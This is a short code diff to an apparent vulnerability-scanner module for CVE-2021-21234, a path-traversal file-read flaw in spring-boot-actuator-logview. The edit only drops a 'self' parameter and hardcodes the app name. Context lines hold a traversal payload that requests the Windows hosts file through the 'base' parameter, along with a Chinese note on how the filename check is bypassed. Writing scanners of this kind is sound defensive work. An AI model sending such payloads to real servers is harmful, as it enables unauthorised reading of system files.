@@ -9,7 +9,7 @@ cve_2021_21234_payloads = [
     {'path': 'manage/log/view?filename=C:\Windows\System32\drivers\etc\hosts&base=../../../../../../../'}
 ]
 
-def cve_2021_21234_scan(self, clients):
+def cve_2021_21234_scan(clients):
     ''' spring-boot-actuator-logview文件包含漏洞
             <= 0.2.13
             虽然检查了文件名参数以防止目录遍历攻击(filename=../somefile 防御了攻击)
@@ -18,7 +18,7 @@ def cve_2021_21234_scan(self, clients):
     client = clients.get('reqClient')
     
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'Spring',
         'vul_type': 'FileRead',
         'vul_id': 'CVE-2021-21234',
     }
